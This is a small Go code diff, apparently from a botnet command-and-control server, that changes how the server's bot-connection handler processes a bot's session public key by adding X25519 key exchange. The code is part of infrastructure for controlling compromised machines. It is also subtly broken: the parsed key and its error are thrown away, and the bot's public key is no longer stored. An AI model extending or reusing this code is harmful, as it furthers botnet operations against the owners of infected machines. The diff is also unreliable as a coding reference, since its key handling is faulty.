@@ -7,6 +7,7 @@ import (
 	"c2/server/register"
 	"c2/server/session"
 	"context"
+	"crypto/ecdh"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -111,7 +112,9 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		}
 
 		if msg.Type == "session" {
-			pb.PublicKey = msg.Message.([]byte)
+			botpbbytes := msg.Message.([]byte)
+			ecdh.X25519().NewPublicKey(botpbbytes)
+
 			priv, pub := session.CalculatePublicKey()
 			pb.PrivatekeyServer = priv
 			wsjson.Write(ctx, con, pub)
